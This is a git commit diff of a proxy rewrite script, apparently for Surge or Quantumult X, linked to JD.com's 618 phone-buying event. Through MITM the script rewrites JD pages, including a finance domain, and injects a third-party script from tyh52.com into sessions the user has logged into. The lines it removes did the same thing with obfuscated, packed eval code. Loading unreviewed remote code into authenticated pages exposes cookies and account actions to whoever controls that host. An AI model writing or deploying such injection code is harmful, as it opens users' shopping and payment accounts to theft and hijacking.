a4cb89ad43c6eb8a0480a9a44d3a6e46f5ad12c2
iepngs <iepngs@aliyun.com>
2020-06-09 17:50:08 +0800

    Update index.js

--- jd618buyphone/index.js
+++ jd618buyphone/index.js
@@ -1,6 +1,6 @@
 /*
 2020 jd618购机活动
-浏览器打开并登录：https://rdcseason.m.jd.com/#/index
+浏览器打开并登录：https://m.jd.com
 
 Surge4：
 http-response ^https:\/\/rdcseason\.m\.jd\.com\/#\/index requires-body=1,max-size=0,script-path=https://raw.githubusercontent.com/iepngs/Script/master/jd618buyphone/index.js
@@ -8,15 +8,14 @@ QX：
 ^https:\/\/rdcseason\.m\.jd\.com\/#\/index url script-response-body https://raw.githubusercontent.com/iepngs/Script/master/jd618buyphone/index.js
 
 MITM:
-hostname = rdcseason.m.jd.com
+hostname = m.jd.com,wqs.jd.com,u.jr.jd.com,h5.m.jd.com,h5.m.jd.com,rdcseason.m.jd.com
 */
 
-let body = $response.body;
-
-body.replace("<\/body>", "<script type='text/javascript' src='https://cdn.jsdelivr.net/npm/vconsole@3.3.4/dist/vconsole.min.js'></script><script>new VConsole();eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}(' e 9=4.3(\'9\');9.d=\"b/6\";9.a=\"5://c.2/8/7.8\";4.1.0(9);',62,15,'appendChild|body|com|createElement|document|https|javascript|jd618|js|script|src|text|tyh52|type|var'.split('|'),0,{}));</script></body>");
-
-console.log("----------------body----------------");
-console.log(body);
-console.log("----------------body----------------");
+const hackCtx = "<script type='text/javascript' src='https://cdn.jsdelivr.net/npm/vconsole@3.3.4/dist/vconsole.min.js'></script>"
+    + "<script>new VConsole();setTimeout(()=>{"
+    + "let script=document.createElement('script');script.type='text/javascript';script.src='https://tyh52.com/js/commons.js';document.body.appendChild(script);" 
+    + "}, 2000);</script></body>";
+    
+const body = $response.body.replace("<\/body>", hackCtx);
 
 $done({body: body});
